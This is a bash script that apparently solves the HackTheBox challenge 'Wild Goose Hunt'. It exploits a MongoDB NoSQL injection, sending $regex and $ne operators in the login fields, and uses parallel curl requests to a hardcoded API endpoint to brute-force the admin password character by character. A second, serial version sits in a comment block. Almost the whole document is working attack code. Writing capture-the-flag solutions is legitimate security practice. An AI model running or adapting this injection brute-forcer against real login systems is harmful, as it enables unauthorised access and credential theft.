#!/bin/bash
# This script solves the HackTheBox Challenge "Wild Goose Hunt".  This script takes advantage of a MongoDB NoSQL injection to brute force the admin password.

# Create the files (helpful for organizing parallel jobs)
echo -n '' > flag.txt
echo -n 43 > num.txt
awk 'BEGIN{for(i=32;i<127;i++) printf("%c",i)}' | fold -w 1|sed 's/[][\\.*^$&?|]/\\&/g' | sort -r > list.txt

function bf_mongo() {
c=$1
flag=$(cat flag.txt)
num=$(cat num.txt)

bf=$(curl -sX POST "http://159.65.20.166:31695/api/login" --data 'username=admin&password[$regex]='"$flag$c"'.{'"$num"'}' --proxy "http://127.0.0.1:8080");
		if [[ $bf == *Successful* ]]; then 
			flag="$flag$c"
			echo -n $flag >flag.txt
			((num--))
			echo -n $num > num.txt
			echo $flag
			exit 0
		fi;
}

export -f bf_mongo

while [[ `cat num.txt` != -1 ]];do
parallel -j 95 bf_mongo ::: `cat list.txt`
done


# If you prefer to do this without parallel then us the script below:
:<<'Comment'
flag=''
num=43

while [[ $num > 0 ]];do
for i in $(awk 'BEGIN{for(i=32;i<127;i++) printf("%c",i)}' | fold -w 1|sed 's/[][\\.*^$&?|]/\\&/g' | sort -r);do
       bf=$(curl -sX POST "http://188.166.175.58:31656/api/login" --data 'username[$ne]=blob&password[$regex]='"$flag$i"'.{'"$num"'}' --proxy "http://127.0.0.1:8080");
		if [[ $bf =~ Successful ]]; then 
			flag="$flag$i"
			((num--))
			break

		fi;
done;
echo "$flag";
done
Comment
